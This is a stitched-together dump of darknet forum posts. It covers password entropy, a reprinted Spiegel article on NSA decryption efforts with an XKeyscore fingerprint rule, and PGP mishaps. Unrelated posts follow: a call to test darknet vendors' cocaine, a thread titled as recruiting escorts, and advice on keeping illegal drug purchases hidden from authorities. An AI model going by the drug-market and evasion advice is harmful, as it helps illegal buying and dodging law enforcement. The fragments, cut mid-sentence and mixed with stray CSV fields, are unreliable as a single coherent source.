functions) for transforming data into apparent gibberish. Some of the most common ciphers in use today (in PGP) are: AES, the Advanced Encryption Standard, Triple-DES (often abbreviated as 3DES), CAST5 and IDEA.   The strength of ciphers (and passphrases) are frequently expressed in bits, thus we have 3 variants on the AES cipher: AES-128, AES-192, and AES-256, where the keys used in these ciphers are 128-bits, 192-bits, and 256-bits respectively. Other ciphers used in PGP are also 128-bit: IDEA and CAST5. An exception is 3DES at 112-bits.   Ciphers of 128-bits (or more) are considered unbreakable by brute force attack. Here is an interesting note from PGP's Jon Callas, describing the difficulty of cracking modern 128-bit ciphers:    So, a passphrase with 128-bits (or more) of entropy would appear to be ideal.   Now we have to deal with the question of how do we determine how much entropy is in a passphrase of a certain length? Thankfully, the calculations on this are pretty straightforward.   One of the most frequently misleading assertions about passwords is that they MUST include special characters. This may (or may not) be necessary, depending on the length of the password we're discussing.   As a general rule, the strength of a password depends on two factors:   * The length of the password; and  * The search space, or the number of characters comprising the set used in the password (or passphrase)  The greater the search space, the shorter your password has to be to afford the same  security.   If your password allows only lowercase, the search space is: 26   If your password allows lower + uppercase, the search space is: 52 (i.e. 26 + 26),  If your password allows lower + uppercase + numerals, the search space is: 62 (i.e. 26 + 26 + 10)  There are 32 special characters that are sometimes permitted in passwords -- these are:   ( ) ` ~ ! @ # $ % ^ & * - + = | \ { } [ ] : ; "" ' < > , . ? / _   If your password allows lower + uppercase + numerals + special characters, the search space is: 94 (i.e. 26 + 26 + 10 + 32)  In situations where we are restricted to short passwords, e.g. 8-16 characters, the use of special characters in addition to uppercase, lowercase and numerals is highly recommended, due to the short password lengths.   Let me illustrate by some examples:   The typical automated teller machine (ATM) allows for a 4-digit PIN number; this gives us a search space of 10,000 -- from 0000 through 9999.   Although this is acceptable for a ATM, it would be laughable as a computer password -- any password cracking software would break this within seconds.   Let's assume that now we are using a system with an 8-character password limitation. Such systems still exist, believe it or not. One such is Torbox. Let's see how it stacks up:   Upper or Lowercase only:                 26^8 = 2.08x10^11 or about 208 billion combinations.         (38 bits of entropy)  Upper + lowercase only:                  52^8 = 5.34x10^13 or about 53,000 billion combinations       (46 bits of entropy)  Upper + lowercase + numerals:            62^8 = 2.18x10^14 or about 218,000 billion combinations      (48 bits of entropy)  Upper + lowercase + numberals + special: 94^8 = 6.09x10^15 or about 6.1 million billion combinations  (52 bits of entropy)  You can see from the numbers that the addition of special characters increases the complexity considerably, but we are still constrained by the much too-short password length.   The major problem wiht the above example (Torbox) is that the allowable password length is simply too short.  More reasonable systems will allow passwords in the 16-35 character limit.   As a little aside, you may find it of interest to learn that the FSB (Federal Security Bureau) the Russian state's successor to the Soviet KGB, recommended to their agents that they use a 27-character password on their computers. Let's do the math, shall we?   27 characters, lowercase-only: 26^27 = 1.60x10^38 This works out to 127 bits of entropy, or just slightly less than the 128-bits afforded by some of the ciphers in PGP. This is 32,000 times as strong as the 3DES cipher, at 112-bits. This should be proof-positive that you DO NOT have to have mixed-case, numerics, or special characters  if the password is long enough.   Let's now look at two more recent examples: Tormail, which had a 25-character password limit, and Mailtor, which has a 35-character limit.   Tormail: 25 char limit, upper+lowercase+numerals: 62^25 = 6.45x10^44 which works out to 149 bits of entropy.   Mailtor: 35 char limit, upper+lowercase+numerals: 62^35 = 5.42x10^62 which works out to 208 bits of entropy.   Both of these are well in excess of the 128-bits that we set as a goal.   Now, let's consider the original poster's 36 characters:   36 chars, lowercase-only: 26^36 = 8.69x10^50 which works out to 169 bits of entropy.   36 chars, mixed-case: 52^36 = 5.97x10^61 which works out to 205 bits of entropy.   36 chars, mixed-case + numerals: 62^36 = 3.36x10^64 which works out to 214 bits of entropy.   36 chars, mixed-case, numerals + special: 94^36 =  1.07x10^71 which works out to 235 bits of entropy.   Any way you slice it, the original poster's 36 character password is more than sufficiently strong to thwart a brute-force attack.   As a final note, I'd like to excerpt some information from Jon Callas' presentation on Cracking PGP which he made at at the 2005 Defcon conference. Note the last reference, about 2^40 hypotheticals per second -- that's about 1.10x10^12 or 1100 billion password guesses per second. Also remember that these remarks were made in 2005 -- I think we can assume that the government is considerably better at it by now, some 9 years later.   So, to sum up, in order to thwart dictionary attacks and/or brute-forcing passwords have to be RANDOM, with about 128 bits of entropy.      Zaphod ","Quote from: Rounded on March 30, 2014, 01:28:42 pmI have a 36-character strong password and full disk encryption. You need at least 37 to be strong.;Modern cryptographic systems are essentially unbreakable, particularly if an adversary is restricted to intercepts. We have argued for, designed, and built systems with 128 bits of security precisely because they are essentially unbreakable. It is very easy to underestimate the power of exponentials. 2^128 is a very big number. Burt Kaliski first came up with this characterization, and if he had a nickel for every time I tell it, he could buy a latte or three.    Imagine a computer that is the size of a grain of sand that can test keys     against some encrypted data. Also imagine that it can test a key in the     amount of time it takes light to cross it. Then consider a cluster of     these computers, so many that if you covered the earth with them, they     would cover the whole planet to the height of 1 meter.

While it  is true that Truecrypt is undergoing a security audit, that does not mean it is insecure. Truecrypt does have a track record -- IIRC, there was a Brazilian banker named Danzas who had several encrypted drive seized by Brazilian police. The Brazilian authorities were unable to make any headway on the encrypted drives, after 6 months of effort, so they enlisted the help of the FBI. The FBI hammered on them for another full year, with no success.

This article was published two days ago and is a very good read  Good news for users of PGP and OTR, not so good for HTTPS.  http://www.spiegel.de/international/germany/inside-the-nsa-s-war-on-internet-security-a-1010361.html  ","When Christmas approaches, the spies of the Five Eyes intelligence services can look forward to a break from the arduous daily work of spying. In addition to their usual job -- attempting to crack encryption all around the world -- they play a game called the ""Kryptos Kristmas Kwiz,"" which involves solving challenging numerical and alphabetical puzzles. The proud winners of the competition are awarded ""Kryptos"" mugs.Encryption -- the use of mathematics to protect communications from spying -- is used for electronic transactions of all types, by governments, firms and private users alike. But a look into the archive of whistleblower Edward Snowden shows that not all encryption technologies live up to what they promise.One example is the encryption featured in Skype, a program used by some 300 million users to conduct Internet video chat that is touted as secure. It isn't really. ""Sustained Skype collection began in Feb 2011,"" reads a National Security Agency (NSA) training document from the archive of whistleblower Edward Snowden. Less than half a year later, in the fall, the code crackers declared their mission accomplished. Since then, data from Skype has been accessible to the NSA's snoops. Software giant Microsoft, which acquired Skype in 2011, said in a statement: ""We will not provide governments with direct or unfettered access to customer data or encryption keys."" The NSA had been monitoring Skype even before that, but since February 2011, the service has been under order from the secret US Foreign Intelligence Surveillance Court (FISC), to not only supply information to the NSA but also to make itself accessible as a source of data for the agency.The ""sustained Skype collection"" is a further step taken by the authority in the arms race between intelligence agencies seeking to deny users of their privacy and those wanting to ensure they are protected. There have also been some victories for privacy, with certain encryption systems proving to be so robust they have been tried and true standards for more than 20 years.For the NSA, encrypted communication -- or what all other Internet users would call secure communication -- is ""a threat"". In one internal training document viewed by SPIEGEL, an NSA employee asks: ""Did you know that ubiquitous encryption on the Internet is a major threat to NSA's ability to prosecute digital-network intelligence (DNI) traffic or defeat adversary malware?""Snipped from NSA document: Encryption considered a ""threat"" ZoomSnipped from NSA document: Encryption considered a ""threat""The Snowden documents reveal the encryption programs the NSA has succeeded in cracking, but, importantly, also the ones that are still likely to be secure. Although the documents are around two years old, experts consider it unlikely the agency's digital spies have made much progress in cracking these technologies. ""Properly implemented strong crypto systems are one of the few things that you can rely on,"" Snowden said in June 2013, after fleeing to Hong Kong.The digitization of society in the past several decades has been accompanied by the broad deployment of cryptography, which is no longer the exclusive realm of secret agents. Whether a person is conducting online banking, Internet shopping or making a phone call, almost every Internet connection today is encrypted in some way. The entire realm of cloud computing -- that is of outsourcing computing tasks to data centers somewhere else, possibly even on the other side of the globe -- relies heavily on cryptographic security systems. Internet activists even hold crypto parties where they teach people who are interested in communicating securely and privately how to encrypt their data.German officials suggest ""consistent encryption""In Germany, concern about the need for strong encryption goes right up to the highest levels of the government. Chancellor Angela Merkel and her cabinet now communicate using phones incorporating strong encryption. The government has also encouraged members of the German public to take steps to protect their own communication. Michael Hange, the president of the Federal Office for Information Security, has stated: ""We suggest cryptography -- that is, consistent encryption.""It's a suggestion unlikely to please some intelligence agencies. After all, the Five Eyes alliance -- the secret services of Britain, Canada, Australia, New Zealand and the United States -- pursue a clear goal: removing the encryption of others on the Internet wherever possible. In 2013, the NSA had a budget of more than $10 billion. According to the US intelligence budget for 2013, the money allocated for the NSA department called Cryptanalysis and Exploitation Services (CES) alone was $34.3 million.Last year, the Guardian, New York Times and ProPublica reported on the contents of a 2010 presentation on the NSA's BULLRUN decryption program, but left out many specific vulnerabilities. The presentation states that, ""for the past decade, NSA has led an aggressive, multipronged effort to break widely used Internet encryption technologies,"" and ""vast amounts of encrypted Internet data which have up till now been discarded are now exploitable."" Decryption, it turns out, works retroactively - once a system is broken, the agencies can look back in time in their databases and read stuff they could not read before.The number of Internet users concerned about privacy online has risen dramatically since the first Snowden revelations. But people who consciously use strong end-to-end encryption to protect their data still represent a minority of the Internet-using population. There are a number of reasons for this: Some believe encryption is too complicated to use. Or they think the intelligence agency experts are already so many steps ahead of them that they can crack any encryption program.Still Safe from the NSAThis isn't true. As one document from the Snowden archive shows, the NSA had been unsuccessful in attempts to decrypt several communications protocols, at least as of 2012. An NSA presentation for a conference that took place that year lists the encryption programs theAttacks against Crypto    Guide for Analysts on how to use the PRISM Skype Collection    GCHQ Briefing on the BULLRUN Program    GCHQ Presentation on the BULLRUN Programs Decryption Capabilities    NSA LONGHAUL program for end-to-end attack orchestration and key recovery service    BLUESNORT program on ""Net Defense"" from Encrypted Communications    Presentation from the SIGDEV Conference 2012 explaining which encryption protocols and techniques can be attacked and which not    NSA program SCARLETFEVER explaining how attacks on encrypted connections are orchestrated    Description of VOIP Telephony Encryption methods and cryptanalytic and other ways to attackAmericans failed to crack. In the process, the NSA cryptologists divided their targets into five levels corresponding to the degree of the difficulty of the attack and the outcome, ranging from ""trivial"" to ""catastrophic.""Monitoring a document's path through the Internet is classified as ""trivial."" Recording Facebook chats is considered a ""minor"" task, while the level of difficulty involved in decrypting emails sent through Moscow-based Internet service provider ""mail.ru"" is considered ""moderate."" Still, all three of those classifications don't appear to pose any significant problems for the NSA.Things first become troublesome at the fourth level. The presentation states that the NSA encounters ""major"" problems in its attempts to decrypt messages sent through heavily encrypted email service providers like Zoho or in monitoring users of the Tor network*, which was developed for surfing the web anonymously. Tor, otherwise known as The Onion Router, is free and open source software that allows users to surf the web through a network of more than 6,000 linked volunteer computers. The software automatically encrypts data in a way that ensures that no single computer in the network has all of a user's information. For surveillance experts, it becomes very difficult to trace the whereabouts of a person who visits a particular website or to attack a specific person while they are using Tor to surf the Web.Cryptanalytics    General Description how NSA handles encrypted traffic    Intercept with PGP encrypted message    Classification Guide for Cryptanalysis    Procedural GCHQ Document on how analysts are to handle encrypted traffic    NSA / GCHQ Crypt Discovery Joint Collaboration Activity    NSA Cryptographic Modernization (CryptoMod) Classification Guide    ""National Information Assurance Research Laboratory (NIARL)"": Newsletter, Keyword TUNDRA    What Your Mother Never Told You About the development of Signal Intelligence    Intercept with OTR encrypted chatThe NSA also has ""major"" problems with Truecrypt, a program for encrypting files on computers. Truecrypt's developers stopped their work on the program last May, prompting speculation about pressures from government agencies. A protocol called Off-the-Record (OTR) for encrypting instant messaging in an end-to-end encryption process also seems to cause the NSA major problems. Both are programs whose source code can be viewed, modified, shared and used by anyone. Experts agree it is far more difficult for intelligence agencies to manipulate open source software programs than many of the closed systems developed by companies like Apple and Microsoft. Since anyone can view free and open source software, it becomes difficult to insert secret back doors without it being noticed. Transcripts of intercepted chats using OTR encryption handed over to the intelligence agency by a partner in Prism -- an NSA program that accesses data from at least nine American internet companies such as Google, Facebook and Apple -- show that the NSA's efforts appear to have been thwarted in these cases: ""No decrypt available for this OTR message."" This shows that OTR at least sometimes makes communications impossible to read for the NSA.ZoomThings become ""catastrophic"" for the NSA at level five - when, for example, a subject uses a combination of Tor, another anonymization service, the instant messaging system CSpace and a system for Internet telephony (voice over IP) called ZRTP. This type of combination results in a ""near-total loss/lack of insight to target communications, presence,"" the NSA document states.ZRTP, which is used to securely encrypt conversations and text chats on mobile phones, is used in free and open source programs like RedPhone and Signal. ""It's satisfying to know that the NSA considers encrypted communication from our apps to be truly opaque,"" says RedPhone developer Moxie Marlinspike.Too Robust for Fort MeadeAlso, the ""Z"" in ZRTP stands for one of its developers, Phil Zimmermann, the same man who created Pretty Good Privacy, which is still the most common encryption program for emails and documents in use today. PGP is more than 20 years old, but apparently it remains too robust for the NSA spies to crack. ""No decrypt available for this PGP encrypted message,"" a further document viewed by SPIEGEL states of emails the NSA obtained from Yahoo.Phil Zimmermann wrote PGP in 1991. The American nuclear weapons freeze activist wanted to create an encryption program that would enable him to securely exchange information with other like-minded individuals. His system quickly became very popular among dissidents around the world. Given its use outside the United States, the US government launched an investigation into Zimmermann during the 1990s for allegedly violating the Arms Export Control Act. Prosecutors argued that making encryption software of such complexity available abroad was illegal. Zimmermann responded by publishing the source code as a book, an act that was constitutionally protected as free speech.PGP continues to be developed and various versions are available today. The most widely used is GNU Privacy Guard (GnuPG), a program developed by German programmer Werner Koch. One document shows that the Five Eyes intelligence services sometimes use PGP themselves. The fact is that hackers obsessed with privacy and the US authorities have a lot more in common than one might initially believe. The Tor Project*, was originally developed with the support of the US Naval Research Laboratory.Deanonymizing    Explanation of a potential technique to deanonymise users of the TOR network    Analytics on security of TOR hidden services    Overview on Internet Anonymization Services on how they work    TOR deanonymisation research    TOR Overview of Existing Techniques    A potential technique to deanonymise users of the TOR networkToday, NSA spies and their allies do their best to subvert the system their own military helped conceive, as a number of documents show. Tor deanonymization is obviously high on the list of NSA priorities, but the success achieved here seems limited. One GCHQ document from 2011 even mentions trying to decrypt the agencies' own use of Tor -- as a test case.To a certain extent, the Snowden documents should provide some level of relief to people who thought nothing could stop the NSA in its unquenchable thirst to collect data. It appears secure channels still exist for communication. Nevertheless, the documents also underscore just how far the intelligence agencies already go in their digital surveillance activities.Internet security comes at various levels -- and the NSA and its allies obviously are able to ""exploit"" -- i.e. crack -- several of the most widely used ones on a scale that was previously unimaginable.VPN Security only VirtualOne example is virtual private networks (VPN), which are often used by companies and institutions operating from multiple offices and locations. A VPN theoretically creates a secure tunnel between two points on the Internet. All data is channeled through that tunnel, protected by cryptography. When it comes to the level of privacy offered here, virtual is the right word, too. This is because the NSA operates a large-scale VPN exploitation project to crack large numbers of connections, allowing it to intercept the data exchanged inside the VPN -- including, for example, the Greek government's use of VPNs. The team responsible for the exploitation of those Greek VPN communications consisted of 12 people, according to an NSA document SPIEGEL has seen.Attacks on VPN    NSA High Level Description on TURMOIL / APEX Programs on Attacking VPN    Explanation of the GALLANTWAVE that decrypts VPN Traffic within LONGHAUL    Intro to the VPN Exploitation Process mentioning the protocols attacked - PPTP, IPSEC, SSL, SSH)    Analytic Challenges from Active-Passive Integration when NSA attacks IPSEC VPNs    Overview of the capabilities of the VALIANTSURF program    MALIBU Architecture Overview to exploit VPN Communication    POISENNUT Virtual Private Network Attack Orchestrator (VAO)    NSA Presentation on the development of Attacks on VPN    NSA Presentation on the Analysis and Contextualisation of data from VPN    Description of existing projects on VPN decryption    Explanation of the Transform Engine Emulator when attacking VPN    Explanation of the POISENNUT Product and its role when attacking VPN    Explanation of the TURMOIL GALLANTWAVE Program and its role when attacking VPN    Processing of data from exploited VPN in the TURMOIL program    Decryption of VPN Connections within the VALIANTSURF program    Description on the processing of VPN data packets within the TURMOIL program    Explanation on the SPIN9 program on end-to-end attacks on VPNThe NSA also targeted SecurityKiss, a VPN service in Ireland. The following fingerprint for Xkeyscore, the agency's powerful spying tool, was reported to be tested and working against the service:    fingerprint('encryption/securitykiss/x509') = $pkcs and ( ($tcp and from_port(443)) or ($udp and (from_port(123) or from_por (5000) or from_port(5353)) ) ) and (not (ip_subnet('10.0.0.0/8' or '172.16.0.0/12' or '192.168.0.0/16' )) ) and 'RSA Generated Server Certificate'c and 'Dublin1'c and 'GL CA'c;According to an NSA document dating from late 2009, the agency was processing 1,000 requests an hour to decrypt VPN connections. This number was expected to increase to 100,000 per hour by the end of 2011. The aim was for the system to be able to completely process ""at least 20 percent"" of these requests, meaning the data traffic would have to be decrypted and reinjected. In other words, by the end of 2011, the NSA's plans called for simultaneously surveilling 20,000 supposedly secure VPN communications per hour.VPN connections can be based on a number of different protocols. The most widely used ones are called Point-to-Point Tunneling Protocol (PPTP) and Internet Protocol Security (Ipsec). Both seem to pose few problems for the NSA spies if they really want to crack a connection. Experts have considered PPTP insecure for some time now, but it is still in use in many commercial systems. The authors of one NSA presentation boast of a project called FOURSCORE that stores information including decrypted PPTP VPN metadata.Using a number of different programs, they claim to have succeeded in penetrating numerous networks. Among those surveilled were the Russian carrier Transaero Airlines, Royal Jordanian Airlines as well as Moscow-based telecommunications firm Mir Telematiki. Another success touted is the NSA's surveillance of the internal communications of diplomats and government officials from Afghanistan, Pakistan and Turkey.Ipsec as a protocol seems to create slightly more trouble for the spies. But the NSA has the resources to actively attack routers involved in the communication process to get to the keys to unlock the encryption rather than trying to break it, courtesy of the unit called Tailored Access Operations: ""TAO got on the router through which banking traffic of interest flows,"" it says in one presentation.Anything But SecureEven more vulnerable than VPN systems are the supposedly secure connections ordinary Internet users must rely on all the time for Web applications like financial services, e-commerce or accessing webmail accounts. A lay user can recognize these allegedly secure connections by looking at the address bar in his or her Web browser: With these connections, the first letters of the address there are not just http -- for Hypertext Transfer Protocol -- but https. The ""s"" stands for ""secure"". The problem is that there isn't really anything secure about them.Attacks on SSL/TLS    NSA Experiment for massive SSL/TLS Decryption    Canadian Document from CES on TLS Trends    Details on how NSA uses the SCARLETFEVER program to attack Scure Sockets Layer (SSL)/Transport Layer Scurity (TLS)    Analysis from SSL/TLS Connections through GCHQ in the flying pig databaseThe NSA and its allies routinely intercept such connections -- by the millions. According to an NSA document, the agency intended to crack 10 million intercepted https connections a day by late 2012. The intelligence services are particularly interested in the moment when a user types his or her password. By the end of 2012, the system was supposed to be able to ""detect the presence of at least 100 password based encryption applications"" in each instance some 20,000 times a month.For its part, Britain's GCHQ collects information about encryption using the TLS and SSL protocols -- the protocols https connections are encrypted with -- in a database called ""FLYING PIG."" The British spies produce weekly ""trends reports"" to catalog which services use the most SSL connections and save details about those connections. Sites like Facebook, Twitter, Hotmail, Yahoo and Apple's iCloud service top the charts, and the number of catalogued SSL connections for one week is in the many billions -- for the top 40 sites alone.Hockey sites monitoredCanada's Communications Security Establishment (CSEC) even monitors sites devoted to the country's national pastime: ""We have noticed a large increase in chat activity on the hockeytalk sites. This is likely due to the beginning of playoff season,"" it says in one presentation.The NSA also has a program with which it claims it can sometimes decrypt the Secure Shell protocol (SSH). This is typically used by systems administrators to log into employees' computers remotely, largely for use in the infrastructure of businesses, core Internet routers and other similarly important systems. The NSA combines the data collected in this manner with other information to leverage access to important systems of interest.Weakening Cryptographic StandardsBut how do the Five-Eyes agencies manage to break all these encryption standards and systems? The short answer is: They use every means available.One method is consciously weakening the cryptographic standards that are used to implement the respective systems. Documents seen by SPIEGEL show that NSA agents travel to the meetings of the Internet Engineering Task Force (IETF), an organization that develops such standards, to gather information but presumably also to influence the discussions there. ""New session policy extensions may improve our ability to passively target two sided communications,"" says a brief write-up of an IETF meeting in San Diego on an NSA-internal Wiki.This process of weakening encryption standards has been going on for some time. A classification guide, a document that explains how to classify certain types of secret information, labels ""the fact that NSA/CSS makes cryptographic modifications to commercial or indigenous cryptographic information security devices or systems in order to make them exploitable"" as Top Secret.NSA classification guide: ""Cryptographic modifications"" ZoomNSA classification guide: ""Cryptographic modifications""Cryptographic systems actively weakened this way or faulty to begin with are then exploited using supercomputers. The NSA maintains a system called Longhaul, an ""end-to-end attack orchestration and key recovery service for Data Network Cipher and Data Network Session Cipher traffic."" Basically, Longhaul is the place where the NSA looks for ways to break encryption. According to an NSA document, it uses facilities at the Tordella Supercomputer Building at Fort Meade, Maryland, and Oak Ridge Data Center in Oak Ridge, Tennessee. It can pass decrypted data to systems such as Turmoil -- a part of the secret network the NSA operates throughout the world, used to siphon off data. The cover term for the development of these capabilities is Valientsurf. A similar program called Gallantwave is meant to ""break tunnel and session ciphers.""In other cases, the spies use their infrastructure to steal cryptographic keys from the configuration files found on Internet routers. A repository called Discoroute contains ""router configuration data from passive and active collection"" one document states. Active here means hacking or otherwise infiltrating computers, passive refers to collecting data flowing through the Internet with secret NSA-operated computers.An important part of the Five Eyes' efforts to break encryption on the Internet is the gathering of vast amounts of data. For example, they collect so-called SSL handshakes -- that is, the first exchanges between two computers beginning an SSL connection. A combination of metadata about the connections and metadata from the encryption protocols then help to break the keys which in turn allow reading or recording the now decrypted traffic.If all else fails, the NSA and its allies resort to brute force: They hack their target's computers or Internet routers to get to the secret encryption -- or they intercept computers on the way to their targets, open them and insert spy gear before they even reach their destination, a process they call interdiction.A Grave Threat to SecurityFor the NSA, the breaking of encryption methods represents a constant conflict of interest. The agency and its allies do have their own secret encryption methods for internal use. But the NSA is also tasked with providing the US National Institute of Standards and Technology (NIST) with ""technical guidelines in trusted technology"" that may be ""used in cost-effective systems for protecting sensitive computer data."" In other words: Checking cryptographic systems for their value is part of the NSA's job. One encryption standard the NIST explicitly recommends is the Advanced Encryption Standard (AES). The standard is used for a large variety of tasks, from encrypting the PIN numbers of banking cards to hard disk encryption for computers.One NSA document shows that the agency is actively looking for ways to break the very standard it recommends - this section is marked as ""Top Secret"" (TS): ""Electronic codebooks, such as the Advanced Encryption Standard, are both widely used and difficult to attack cryptanalytically. The NSA has only a handful of in-house techniques. The TUNDRA project investigated a potentially new technique -- the Tau statistic -- to determine its usefulness in codebook analysis.""ZoomThe fact that large amounts of the cryptographic systems that underpin the entire Internet have been intentionally weakened or broken by the NSA and its allies poses a grave threat to the security of everyone who relies on the Internet -- from individuals looking for privacy to institutions and companies relying on cloud computing. Many of these weaknesses can be exploited by anyone who knows about them -- not just the NSA.Inside the intelligence community, this danger is widely known: According to a 2011 document, 832 individuals at GCHQ alone were briefed into the BULLRUN project, whose goal is a large-scale assault on Internet security.By Jacob Appelbaum, Aaron Gibson, Christian Grothoff, Andy MÃ¼ller-Maguhn, Laura Poitras, Michael Sontheimer and Christian StÃ¶cker* Two co-authors of this article, Jacob Appelbaum and Aaron Gibson, work on the Tor-Project. Appelbaum also works on the OTR project, as well as contributing to other encryption programs."

CAs can sign unlimited sub CA keys. Certificate revocation has never worked properly.  The SSH attacks only seem to work when using passwords and weak algorithms. Personally, I've been using SSH keys since 2003 and I rotate them every year so I just laughed at that.

I was very surprised that PGP still thwarts the spooks. I mean, it is 1990s technology after-all.    The GCHQ attacks on Tor are not new either. Locating a hidden service with traffic correlation/confirmation attacks isn't new. There are many white papers about it. The fact that you can make the endpoint talk when you want it to, in the case of hidden services, is really the weak point.

Let me give you an example of a PGP fuck up from real life that I had to deal with about 10 years ago (certain details of this story changed to protect anonymity). One time, I had to give the login credentials to a corporate email account to my coworker that was going to take over that email account. We opted to use PGP to encrypt the username and password in an email. So he generated and gave me a PGP public key, and I put the username and password in the text of an email, clicked ""encrypt and sign"" in my mail client, and sent the email. My coworker got the email, decrypted it, and then replied to the email UNENCRYPTED ""hey thanks, I got the username and password fine and was able to log in."" Of course, he forgot to delete the now UNENCRYPTED text with the username and password in his mail client when he sent the reply, and the reply email contained the password in plain text. So basically, he fucked up and we had to report this as a security breach to our boss, get reprimanded for being in violation of security policies by sending passwords in an email, and change the password. Technically it was his fault, but thinking back I should have put the username and password in an encrypted text file as an attachment to prevent this error from happening in the first place.  The moral of the story: The crypto in PGP is really good, but the users are idiots and can mess it up.",""

We aim to test the cocaine of as many top tier vendors as possible to determine whether their claims live up to their product and whether they have any nasties in there. All tests are conducted anonymously so the vendors can't cheat and send us a better sample than that of the general public. However we do welcome vendor funded tests which are still conducted anonymously, just the vendor donates the cost of the buy (minimum 0.5g if offered) which obviously goes straight back to them and the cost of the test itself. Any large buyer donators requests are given a heavy weighting when we decide who to test.  Can I make it clear though that we are not affiliated with the lab in any way other than its customers.

They actually use this to help bust malware authors world-wide and map authors of software.. They most likely correlate it to search and account data on the back-end to profile some more..

"The Hub Forums","Zaphod","6144.0","2014-12-29T18:33:37","Looking for European girls to do escort work in Netherlands.[LEGAL!]","Start Here/For Beginners"," Meet Jess the Escort Who Takes Bitcoin http://allthingsvice.com/2014/11/26/meet-jess-the-escort-who-takes-bitcoin/  When clients book a good time with Jess, they get more than their pick of her available services. For the past couple of months, they have also been receiving a lesson in Bitcoin.  [photo] Jessica wants more clients to use Bitcoin  âI am the only escort who takes Bitcoinâ Jess claims in her soft accent over a coffee at Crown Casino. She is petite and conservatively dressed, but the gym-fit curves she has on display on her website are evident nonetheless. She is excited about the potential of the cryptocurrency for her industry. The benefits, she thinks, are obvious for both escorts and clients.  âSay someone books me for an overnight for $3000; theyâve got to take that money out of their bank account. And if theyâve got wives, theyâll be going Whereâs the money going? What are you spending $3000 on?â she says. âIf they spent $3000 on Bitcoin instead of just withdrawing it in cash, then theyâve got the excuse that theyâre buying Bitcoin because you can buy things online with it. Or they can just have the excuse that theyâre investing in cryptocurrencyâ.  Jess sees a few clients a week and most are regulars. Many are married and for some escorts become an addiction.  âI had a client last year, before I accepted Bitcoin who couldnât see me any more because his wife found out. And she found out through bank statements and the regular weekly withdrawal of thousands of dollars which was unaccounted for. If heâd just used Bitcoin, he never would have been found outâ.  Like many in her profession, Jess is paranoid about her privacy (sheâs blurred out her face on her website, but take it from me, sheâs gorgeous). Other than the one friend who introduced her to escorting when she was an 18-year-old uni student, her friends and family are unaware of what she does. She even managed to keep her moonlighting secret from a long-term boyfriend. So she would also welcome the option to pay her advertising expenses in a more discreet manner.  âI think it would be good for the companies I pay for advertising to accept Bitcoin rather than credit card or direct debit or whatever,â she says.  Although a Melbourne lass, Jess takes her assets on tour every few weeks, with regular trips to Sydney and Perth. Home or away, she will only ever meet clients in CBD hotels and she tends to stick to older guys. She will also see middle-aged couples up for a special treat: âSome of the women are filthy!â Younger guys, she says, have too much to prove and are determined to get their âmoneyâs worth,â and when joining young couples she often feels the female has been coerced into it rather than it being a joint decision. But this means she has to try and explain Bitcoin to a generation who havenât necessarily grown up online. Success so far has been limited.  âIâve only had three different clients so far [pay in Bitcoin]â, Jess says. The entire balance of her Hive wallet is income from services rendered. Bitcoin is still a bit of a novelty and sheâs enjoying the investment opportunity. âI just keep those bitcoins. I probably would spend little bits here and there, but I think itâs just fun to keep them in my bitcoin wallet and see what happens to themâ.  She did briefly remove the Bitcoin option. âOne of my clients warned me not to do it. He does mining and guys buy bitcoin from him. And he said theyâre really roughâ.  She pointed out that he was a nice guy and she figured theyâd all be geeks like him.  âHe said no, most of them are into drug trafficking and stuff like that. He said theyâre the ones who want to get rid of their bitcoinsâ.  She considered his warning and âI did take it down for a day, then I thought nah, Iâll put it back upâ.  Although Jess enjoys her work, she has a plan to quit the industry within two years, once she has saved enough to start her own business. âIâm thinking of opening up a store â not sex-related â maybe in Sydney or Perth. âIâve got two years to figure it out, do a business plan and stop workingâ.  You can bet sheâll be taking Bitcoin.  You can follow Jess on @JessicaEllisXX  Here is what the escort Eiley featured on her blog charges:    1 hour                            $ 650  1.5 hours                       $1000  2 hours                          $1300  3 hours                          $1950  4 hours                          $2250   Overnight                       Regular clients only  Presumably, these are Australian dollars.

Would love to get a discussion going on this topic, thanks.  It's highly probable and somewhat documented, that a/all lettered agency/s are using all the information they can gather to make risk assesments on all people world wide. We all create 'fingerprints' online. Even when we're offline, our fingerprints are still there...it is very difficult to mask them and we can rarely prevent them. They are made up of every single click, time between task (click, scroll, etc), words you type, how you type them and where you type them. Imagine it like an event log of every little tedious detail to form a 'fingerprint'. Using that information lets them unmask you and reveal your ""anonymous"" self. People think creating different nyms (usernames) online and hiding behind each different one allows you to become a ""new person"". Just like in real life, our fingerprints tell our true identity and they've very hard to remove. They are moving towards a future where its rather hard to hide ones fingerprints (IPv6).  That being said and if I was a gambling candy bar and one was to order ""a foodsaver machine, foodsaver bags, baggies, rolling papers, smoking related products..etc on ebay and amazon"" they are going to be labeled as a person who possibly saves weed for long term usage, highly likely smokes said weed, and isn't afraid to tie their legal name to such actions. Your most definitely going to be put on a list. This person also isnt a very big threat because they don't seem like they are distributing said weed and are stupid enough to lead us to the trail. But thats only if they dont know your other fingerprints, which they most likely do...we all leave a trail, one way or another. The best thing we can do is try to deminish that trail. We can try our best but I feel if we keep going on the same train we currently are on, it doesnt look positive.  Some things a person can do to stretch the trail making to more difficult to track crumbs (metadata, fingerprints) is by using ""anonymous"" . Why quote anonymous there? If said three letter agency really wanted to track those crumbs, they most definitely have the means, manpower and money to find those crumbs leading back to you. So a few key factors that most likely wont put you on their shit list are: Do not tie your legit/legal name to illegal activities or things that invlolve illegal acitivies, do not open discuss those illegal activities with others (in real life and especially online, become the lurkness monster), and try your best to stay away from people that openly partake/discuss  illegal activities. If you feel like in the past you might fit one or all of these criteria, its sad to say, we have a shit list winner. The most successful vendors/buyers stay below the radar and don't want attention. Hopefully the shitbarometer is broken and there wont be a shitpocalipse but only time will tell...",""

Do you fit the stereotype of someone who would do this?     The other question is: are you even worth their resources to bother investigating this? Again, perhaps a threshold of interest: what was seized, how much... does the local police chief have a hard-on for the War Against (Some) Drugs?   Regardless, if I was a gambling man, I would say that a second seizure would likely pique their interest enough to bother with you -- and any claims that you weren't the one who ordered this would start to seem less plausible.

